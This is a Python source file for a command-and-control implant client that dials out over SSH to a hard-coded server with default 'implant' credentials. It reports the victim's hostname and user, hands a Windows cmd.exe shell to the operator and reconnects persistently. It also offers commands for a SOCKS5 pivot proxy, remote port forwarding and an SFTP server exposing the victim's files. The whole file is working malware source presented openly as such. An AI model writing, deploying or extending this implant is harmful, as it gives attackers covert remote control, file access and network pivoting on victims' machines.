import paramiko
import subprocess
import os
import sys
import socket
import getpass
import time
import logging
import argparse
import platform
import threading
from typing import Dict, Any, Optional, Callable, List
from .sftp.stub_sftp import StubServer, StubSFTPServer
import struct
from abc import ABC, abstractmethod

# logging setup
inglogging = logging.getLogger('C2Client')
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)

# Generate a host key for the SFTP server
HOST_KEY = paramiko.RSAKey.generate(2048)


class Command(ABC):
    """Base class for all commands"""
    
    def __init__(self, session):
        self.session = session
    
    @property
    def name(self) -> str:
        """Returns the command name"""
        return self.__class__.__name__.lower().replace('command', '')
    
    @property
    def help(self) -> str:
        """Returns help information"""
        return "No help available"
    
    @abstractmethod
    def execute(self, args: List[str]) -> bool:
        """Execute the command with the given arguments"""
        pass

    def validate_args(self, args: List[str], min_count: int, usage: str) -> bool:
        """Validate argument count and show usage if invalid"""
        if len(args) < min_count:
            self.session.send_message(f"Usage: {usage}")
            return False
        return True


class HelpCommand(Command):
    """Displays help for available commands"""
    
    def __init__(self, session, command_registry):
        super().__init__(session)
        self.command_registry = command_registry
    
    @property
    def help(self) -> str:
        return "Show available commands and their usage"
    
    def execute(self, args: List[str]) -> bool:
        self.session.send_message("\r\n=== Available Commands ===\r\n")
        
        for cmd_name, cmd in sorted(self.command_registry.get_commands().items()):
            self.session.send_message(f"!{cmd_name} - {cmd.help}\r\n")
            
        return True


class StatusCommand(Command):
    """Display status of active services"""
    
    @property
    def help(self) -> str:
        return "Show active forwarding and services"
    
    def execute(self, args: List[str]) -> bool:
        port_forwarder = self.session.get_port_forwarder()
        sftp_service = self.session.get_sftp_service()
        
        self.session.send_message("\r\n=== Active Port Forwarding ===\r\n")
        
        # Remote forwarding
        if port_forwarder.remote_forward_threads:
            self.session.send_message("Remote forwarding:\r\n")
            for port in port_forwarder.remote_forward_threads:
                if port_forwarder.remote_forward_threads[port].is_alive():
                    self.session.send_message(f"  Remote port {port}\r\n")
        
        # Dynamic forwarding
        if port_forwarder.dynamic_threads:
            self.session.send_message("Dynamic (SOCKS5) forwarding:\r\n")
            for port in port_forwarder.dynamic_threads:
                if port_forwarder.dynamic_threads[port].is_alive():
                    self.session.send_message(f"  SOCKS5 proxy on port {port}\r\n")
        
        # SFTP
        if sftp_service and sftp_service.active_ports:
            self.session.send_message("SFTP servers:\r\n")
            for port in sftp_service.active_ports:
                self.session.send_message(f"  SFTP on port {port}\r\n")
        
        if (not port_forwarder.remote_forward_threads and 
            not port_forwarder.dynamic_threads and
            not (sftp_service and sftp_service.active_ports)):
            self.session.send_message("No active forwarding\r\n")
            
        return True


class SFTPCommand(Command):
    """Manage SFTP server"""
    
    @property
    def help(self) -> str:
        return "Start/stop SFTP server: !sftp start|stop [port]"
    
    def execute(self, args: List[str]) -> bool:
        if not self.validate_args(args, 1, "!sftp start|stop [port]"):
            return True
            
        action = args[0]
        port = int(args[1]) if len(args) > 1 else 3333
        sftp_service = self.session.get_sftp_service()
        
        if action == 'start':
            return sftp_service.start_sftp_server(port)
        elif action == 'stop':
            return sftp_service.stop_sftp_server(port)
        else:
            self.session.send_message("Unknown action. Use start or stop.\r\n")
            return True


class RForwardCommand(Command):
    """Manage remote port forwarding"""
    
    @property
    def help(self) -> str:
        return "Remote port forwarding: !rforward start REMOTE_PORT LOCAL_HOST LOCAL_PORT | !rforward stop REMOTE_PORT"
    
    def execute(self, args: List[str]) -> bool:
        if not self.validate_args(args, 1, "!rforward start REMOTE_PORT LOCAL_HOST LOCAL_PORT\r\n       !rforward stop REMOTE_PORT"):
            return True
            
        action = args[0]
        port_forwarder = self.session.get_port_forwarder()
        
        if action == 'start':
            if not self.validate_args(args, 4, "!rforward start REMOTE_PORT LOCAL_HOST LOCAL_PORT"):
                return True
                
            remote_port = int(args[1])
            local_host = args[2]
            local_port = int(args[3])
            
            # Create a handler that forwards to the specified local host:port
            def create_handler(channel):
                def handler():
                    try:
                        # Connect to local service
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.connect((local_host, local_port))
                        # Start bidirectional forwarding
                        port_forwarder._bidirectional_forward(sock, channel)
                    except Exception as e:
                        logging.error(f"Error handling remote forwarding: {e}")
                        if channel:
                            channel.close()
                return handler
            
            return port_forwarder.start_remote_forwarding(remote_port, create_handler)
            
        elif action == 'stop':
            if not self.validate_args(args, 2, "!rforward stop REMOTE_PORT"):
                return True
                
            remote_port = int(args[1])
            return port_forwarder.stop_remote_forwarding(remote_port)
            
        else:
            self.session.send_message("Unknown action. Use start or stop.\r\n")
            return True


class DynamicCommand(Command):
    """Manage dynamic SOCKS5 proxy forwarding"""
    
    @property
    def help(self) -> str:
        return "Dynamic SOCKS5 proxy: !dynamic start LOCAL_PORT | !dynamic stop LOCAL_PORT"
    
    def execute(self, args: List[str]) -> bool:
        if not self.validate_args(args, 1, "!dynamic start LOCAL_PORT\r\n       !dynamic stop LOCAL_PORT"):
            return True
            
        action = args[0]
        port_forwarder = self.session.get_port_forwarder()
        
        if action == 'start':
            if not self.validate_args(args, 2, "!dynamic start LOCAL_PORT"):
                return True
                
            local_port = int(args[1])
            return port_forwarder.start_remote_socks(local_port)
            
        elif action == 'stop':
            if not self.validate_args(args, 2, "!dynamic stop LOCAL_PORT"):
                return True
                
            local_port = int(args[1])
            return port_forwarder.stop_remote_forwarding(local_port)
            
        else:
            self.session.send_message("Unknown action. Use start or stop.\r\n")
            return True


class CommandRegistry:
    """Registry for available commands"""
    
    def __init__(self, session):
        self.session = session
        self.commands = {}
        
    def register_command(self, command_class):
        """Register a command class"""
        command = command_class(self.session) if command_class != HelpCommand else command_class(self.session, self)
        self.commands[command.name] = command
        
    def process_command(self, command_line: str) -> bool:
        """Process a command string, return True if processed, False otherwise"""
        parts = command_line.strip().split()
        if not parts or not parts[0].startswith('!'):
            return False
            
        cmd_name = parts[0][1:]  # Remove the ! prefix
        if cmd_name not in self.commands:
            self.session.send_message(f"Unknown command: {cmd_name}. Use !help for available commands.\r\n")
            return True
            
        return self.commands[cmd_name].execute(parts[1:])
    
    def get_commands(self):
        """Get all registered commands"""
        return self.commands
        
    def register_default_commands(self):
        """Register the default set of commands"""
        self.register_command(HelpCommand)
        self.register_command(StatusCommand)
        self.register_command(SFTPCommand)
        self.register_command(RForwardCommand)
        self.register_command(DynamicCommand)


class PortForwardingManager:
    """
    Manage port forwarding: remote-to-local, local-to-remote and dynamic (SOCKS5).
    """
    def __init__(self, transport, session):
        self.transport = transport
        self.session = session
        self.remote_forward_threads = {}  # Remote-to-local forwarding
        self.dynamic_threads = {}         # Dynamic SOCKS5 forwarding
        self.running = True

    def start_remote_forwarding(self, remote_port: int, handler_factory: Callable) -> bool:
        """
        Start remote-to-local port forwarding with a custom channel handler
        """
        if remote_port in self.remote_forward_threads and self.remote_forward_threads[remote_port].is_alive():
            self.session.send_message(f"\r\nAlready forwarding remote port {remote_port}\r\n")
            return True
            
        try:
            self.transport.request_port_forward('', remote_port)
            logging.info(f"Requested remote port forwarding on port {remote_port}")
            self.session.send_message(f"\r\nRemote forwarding started on port {remote_port}\r\n")
        except Exception as e:
            logging.error(f"Remote port forward request failed: {e}")
            self.session.send_message(f"\r\nRemote port forwarding failed: {e}\r\n")
            return False

        def accept_forwarded():
            port_running = True
            while self.running and port_running:
                try:
                    chan = self.transport.accept(1)
                    if not chan:
                        continue
                    logging.info(f"Incoming forwarded-tcpip channel on remote port {remote_port}")
                    
                    handler = handler_factory(chan)
                    t = threading.Thread(target=handler, daemon=True)
                    t.start()
                except Exception as e:
                    logging.error(f"Error in forwarding thread: {e}")
                    time.sleep(1)
            
            logging.info(f"Stopped accepting connections on remote port {remote_port}")

        forward_thread = threading.Thread(target=accept_forwarded, daemon=True)
        self.remote_forward_threads[remote_port] = forward_thread
        forward_thread.start()
        return True

    def stop_remote_forwarding(self, remote_port: int) -> bool:
        """Stop remote-to-local forwarding on the specified port"""
        if remote_port not in self.remote_forward_threads:
            self.session.send_message(f"\r\nNo remote forwarding active on port {remote_port}\r\n")
            return True
            
        try:
            self.transport.cancel_port_forward('', remote_port)
            self.session.send_message(f"\r\nCancelled remote forwarding on port {remote_port}\r\n")
            if self.remote_forward_threads[remote_port].is_alive():
                self.remote_forward_threads[remote_port].join(2)
            del self.remote_forward_threads[remote_port]
            return True
        except Exception as e:
            logging.error(f"Cancel remote port forward failed: {e}")
            self.session.send_message(f"\r\nError cancelling remote port forward: {e}\r\n")
            return False

    def start_remote_socks(self, remote_port: int) -> bool:
        """Start SOCKS5 proxy on a remote port"""
        def socks_handler_factory(channel):
            return lambda: self._handle_remote_socks(channel)
        
        return self.start_remote_forwarding(remote_port, socks_handler_factory)

    def stop_all_forwarding(self):
        """Stop all active port forwarding"""
        self.running = False
        
        # Stop remote forwarding
        remote_ports = list(self.remote_forward_threads.keys())
        for port in remote_ports:
            self.stop_remote_forwarding(port)
            
        # Stop dynamic forwarding
        dynamic_ports = list(self.dynamic_threads.keys())
        for port in dynamic_ports:
            self.stop_remote_forwarding(port)

    def _bidirectional_forward(self, client_socket, channel):
        """
        Handle bidirectional forwarding between a socket and a channel
        """
        # Forward client -> remote
        def forward_socket_to_channel():
            try:
                while self.running:
                    try:
                        data = client_socket.recv(4096)
                        if not data:
                            break
                        channel.send(data)
                    except Exception as e:
                        logging.debug(f"Socket to channel error: {e}")
                        break
            finally:
                try:
                    channel.close()
                except:
                    pass

        # Forward remote -> client
        def forward_channel_to_socket():
            try:
                while self.running:
                    try:
                        data = channel.recv(4096)
                        if not data:
                            break
                        client_socket.sendall(data)
                    except Exception as e:
                        logging.debug(f"Channel to socket error: {e}")
                        break
            finally:
                try:
                    client_socket.close()
                except:
                    pass

        t1 = threading.Thread(target=forward_socket_to_channel, daemon=True)
        t2 = threading.Thread(target=forward_channel_to_socket, daemon=True)
        t1.start()
        t2.start()
        t1.join()
        t2.join()

    def _handle_remote_socks(self, channel):
        """Handle SOCKS5 connection from remote server"""
        try:
            # SOCKS5 handshake
            # 1. Authentication negotiation
            data = channel.recv(2)
            if len(data) < 2:
                logging.error("SOCKS5 handshake: too short")
                channel.close()
                return
                
            ver, nmethods = data[0], data[1]
            if ver != 5:  # SOCKS5
                logging.error(f"Unsupported SOCKS version: {ver}")
                channel.close()
                return
                
            # Read authentication methods
            methods = channel.recv(nmethods)
            
            # We only support no authentication (0)
            channel.send(b"\x05\x00")  # Ver=5, Method=0 (No auth)
            
            # 2. Command processing
            data = channel.recv(4)
            if len(data) < 4:
                logging.error("SOCKS5 request: too short")
                channel.close()
                return
                
            ver, cmd, rsv, atyp = data[0], data[1], data[2], data[3]
            if ver != 5:
                logging.error(f"Unexpected SOCKS version in request: {ver}")
                channel.close()
                return
                
            # We only support CONNECT command (1)
            if cmd != 1:
                logging.error(f"Unsupported SOCKS5 command: {cmd}")
                channel.send(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")  # Command not supported
                channel.close()
                return
                
            # Process address based on address type
            host = None
            if atyp == 1:  # IPv4
                addr_bytes = channel.recv(4)
                host = socket.inet_ntoa(addr_bytes)
            elif atyp == 3:  # Domain name
                length = channel.recv(1)[0]
                addr_bytes = channel.recv(length)
                host = addr_bytes.decode('utf-8')
            elif atyp == 4:  # IPv6
                addr_bytes = channel.recv(16)
                host = socket.inet_ntop(socket.AF_INET6, addr_bytes)
            else:
                logging.error(f"Unsupported address type: {atyp}")
                channel.send(b"\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00")  # Address type not supported
                channel.close()
                return
                
            # Read port (2 bytes, big endian)
            port_bytes = channel.recv(2)
            port = struct.unpack('!H', port_bytes)[0]
            
            logging.info(f"SOCKS5 CONNECT request for {host}:{port}")
            
            # Connect to the target
            try:
                target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                target_sock.settimeout(10)
                target_sock.connect((host, port))
                target_sock.settimeout(None)
                
                # Connection successful - send success response
                channel.send(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
                
                # Start bidirectional forwarding
                self._bidirectional_forward(target_sock, channel)
            except Exception as e:
                logging.error(f"Error connecting to target: {e}")
                channel.send(b"\x05\x04\x00\x01\x00\x00\x00\x00\x00\x00")  # Host unreachable
                channel.close()
        except Exception as e:
            logging.error(f"Error handling remote SOCKS connection: {e}")
            try:
                channel.close()
            except:
                pass


class SessionInterface:
    """Interface for sending messages and accessing services"""
    
    def send_message(self, message: str):
        """Send message to the client"""
        pass
        
    def get_port_forwarder(self):
        """Get port forwarding manager"""
        pass
        
    def get_sftp_service(self):
        """Get SFTP service"""
        pass


class SFTPService:
    """
    A class to provide SFTP service functionality.
    Uses the port forwarding manager for the underlying transport.
    """
    def __init__(self, session: SessionInterface):
        self.session = session
        self.active_ports = set()

    def create_sftp_handler(self, channel):
        """Create a handler function for SFTP channels"""
        def handle_sftp_channel():
            t = paramiko.Transport(channel)
            t.add_server_key(HOST_KEY)
            StubSFTPServer.ROOT = os.getcwd()
            t.set_subsystem_handler('sftp', paramiko.SFTPServer, StubSFTPServer)
            server = StubServer()
            try:
                t.start_server(server=server)
                # serve until closed
                while t.is_active() and self.session.get_port_forwarder().running:
                    time.sleep(0.5)
            finally:
                t.close()
                
        return handle_sftp_channel

    def start_sftp_server(self, remote_port=3333):
        """Start SFTP server on the specified port"""
        result = self.session.get_port_forwarder().start_remote_forwarding(
            remote_port, 
            self.create_sftp_handler
        )
        if result:
            self.active_ports.add(remote_port)
        return result

    def stop_sftp_server(self, remote_port=3333):
        """Stop SFTP server on the specified port"""
        result = self.session.get_port_forwarder().stop_remote_forwarding(remote_port)
        if result and remote_port in self.active_ports:
            self.active_ports.remove(remote_port)
        return result

    def stop_all_servers(self):
        """Stop all SFTP servers"""
        ports = list(self.active_ports)
        for port in ports:
            self.stop_sftp_server(port)


class C2Client(SessionInterface):
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.ssh_client = None
        self.transport = None
        self.channel = None
        self.process = None
        self.running = True
        self.reconnect_delay = 5
        self.system_info = self._gather_system_info()
        self.forwarder = None
        self.sftp_service = None
        self.command_registry = None
        self.pty = None

    def _gather_system_info(self) -> Dict[str, str]:
        return {
            'hostname': socket.gethostname(),
            'username': getpass.getuser(),
            'platform': platform.system(),
            'version': platform.version(),
            'architecture': platform.machine()
        }

    def connect(self) -> bool:
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            logging.debug(f"Connecting to {self.config['server_ip']}:{self.config['server_port']}")
            self.ssh_client.connect(
                self.config['server_ip'],
                port=self.config['server_port'],
                username=self.config['username'],
                password=self.config['password'],
                timeout=10
            )
            self.transport = self.ssh_client.get_transport()
            self.channel = self.transport.open_session()
            self.channel.get_pty(term='vt100', width=80, height=24)
            self.channel.invoke_shell()

            if self.channel.active:
                # Initialize components
                self.forwarder = PortForwardingManager(self.transport, self)
                self.sftp_service = SFTPService(self)
                self.command_registry = CommandRegistry(self)
                self.command_registry.register_default_commands()

                client_info = (
                    f"Implant checked in from {self.system_info['hostname']} "
                    f"as {self.system_info['username']}\r\n"
                )
                self.channel.send(client_info)
                logging.info("Successfully connected to C2 server")
                return True
            return False
        except Exception as e:
            logging.error(f"Connection error: {e}")
            return False

    def start_shell(self) -> bool:
        """Spawn a local Windows shell via winpty."""
        try:
            import winpty
            self.pty = winpty.PTY(cols=80, rows=24)
            proc_path = os.path.join(os.environ['SYSTEMROOT'], 'System32', 'cmd.exe')
            self.process = self.pty.spawn(proc_path)
            return True
        except Exception as e:
            logging.error(f"Error starting shell: {e}")
            return False

    def forward_io(self):
        def read_from_process():
            while self.running and self.pty and self.channel and self.channel.active:
                data = self.pty.read(4096)
                if data:
                    self.channel.send(data.encode())
        
        def read_from_channel():
            while self.running and self.channel.active:
                if self.channel.recv_ready():
                    data = self.channel.recv(1024).decode()
                    if self.process_command(data):
                        continue
                    self.pty.write(data)
                else:
                    time.sleep(0.05)

        t1 = threading.Thread(target=read_from_process, daemon=True)
        t2 = threading.Thread(target=read_from_channel, daemon=True)
        t1.start(); t2.start()
        while t1.is_alive() and t2.is_alive() and self.running:
            time.sleep(0.5)

    def process_command(self, command: str) -> bool:
        """Process special commands from the server"""
        return self.command_registry.process_command(command)

    def command_loop(self):
        while self.running:
            if not self.channel or not self.channel.active:
                logging.info("Reconnecting...")
                self.disconnect()
                time.sleep(self.reconnect_delay)
                if not self.connect():
                    continue
                self.start_shell()
                threading.Thread(target=self.forward_io, daemon=True).start()
            time.sleep(1)

    def disconnect(self):
        self.running = False
        try:
            # Stop all port forwarding
            if self.forwarder:
                self.forwarder.stop_all_forwarding()
            
            # Close channels and connections
            if self.channel:
                self.channel.close()
            if self.ssh_client:
                self.ssh_client.close()
        except Exception:
            pass

    def run(self):
        if self.connect():
            self.start_shell()
            threading.Thread(target=self.forward_io, daemon=True).start()
            self.command_loop()
    
    # SessionInterface implementation
    def send_message(self, message: str):
        """Send message to the client"""
        if self.channel and self.channel.active:
            try:
                self.channel.send(message)
            except Exception as e:
                logging.error(f"Error sending message: {e}")
    
    def get_port_forwarder(self):
        """Get port forwarding manager"""
        return self.forwarder
    
    def get_sftp_service(self):
        """Get SFTP service"""
        return self.sftp_service


def parse_arguments():
    p = argparse.ArgumentParser()
    p.add_argument("--server", default="192.168.10.135")
    p.add_argument("--port", type=int, default=2222)
    p.add_argument("--username", default="implant")
    p.add_argument("--password", default="implant")
    p.add_argument("--debug", action="store_true")
    return p.parse_args()


def main():
    args = parse_arguments()
    if args.debug:
        logging.getLogger('C2Client').setLevel(logging.DEBUG)
    cfg = {'server_ip': args.server, 'server_port': args.port,
           'username': args.username, 'password': args.password}
    C2Client(cfg).run()


if __name__ == '__main__':
    main()